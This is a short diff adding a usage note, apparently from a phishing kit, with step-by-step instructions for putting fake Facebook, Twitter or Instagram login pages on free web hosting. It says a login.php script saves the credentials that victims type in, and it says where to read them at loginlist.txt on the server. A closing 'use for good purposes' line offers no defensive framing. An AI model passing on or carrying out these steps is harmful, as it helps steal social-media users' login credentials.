@@ -1,0 +1,15 @@
+how to use? Go to 000webhost then sign up thrn create your eeb hosting,
+
+choose a phishing like fb or twit ot insta
+choose1 only then upload then upload the login.php, This script get logs to see who login in your phishing pages
+
+then how to see the login logs?
+just open file login.php
+if you see loginlist.txt this is your server get logs example your site is
+https://site.com
+then go to
+https://site.com/loginlist.txt
+
+pwede mo palitan yan wag kang tanga HAHAHAHHA
+
+Use for goodporpuses
